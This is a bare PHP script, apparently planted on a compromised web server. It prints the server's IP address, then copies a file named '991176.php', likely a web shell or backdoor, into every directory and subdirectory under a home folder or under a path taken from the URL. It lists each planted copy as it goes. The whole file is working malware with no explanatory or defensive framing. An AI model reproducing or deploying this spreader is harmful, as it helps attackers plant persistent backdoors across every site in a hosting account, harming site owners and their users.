<?php
if(!function_exists('posix_getpwuid')){
   if(isset($_GET["path"])){
     $home=$_GET["path"];
   }else{
     echo getcwd();
     die("<br>posix function is not available<br>Please Input Path");
   }
}else{
echo $_SERVER['SERVER_ADDR'];
echo "<br>";

        if(isset($_GET["path"])){
           $home=$_GET["path"];
        }else{
        $arr = posix_getpwuid(posix_getuid());
        $home = $arr["dir"];
        }
}
	
        $files = scandir($home);
        for ($a=0; $a <= count($files); $a++) {
            if ((is_dir($home."/".$files[$a]) && ($files[$a] !== ".") && ($files[$a] !== ".."))) {
                if(copy("991176.php", $home."/".$files[$a]."/991176.php")) {
                    echo $home."/".$files[$a]."/991176.php<br>";
                }
                $subfiles = scandir($home."/".$files[$a]);
                for ($b=0; $b <= count($subfiles); $b++) {
                    if ((is_dir($home."/".$files[$a]."/".$subfiles[$b])) && ($subfiles[$b] !== ".") && ($subfiles[$b] !== "..") && ($home."/".$files[$a]."/" !== $home."/".$files[$a]."/".$subfiles[$b])) {
                        if(copy("991176.php", $home."/".$files[$a]."/".$subfiles[$b]."/991176.php")) {
                            echo $home."/".$files[$a]."/".$subfiles[$b]."/991176.php<br>";
                        }
                    }
                }
            }
        }
?>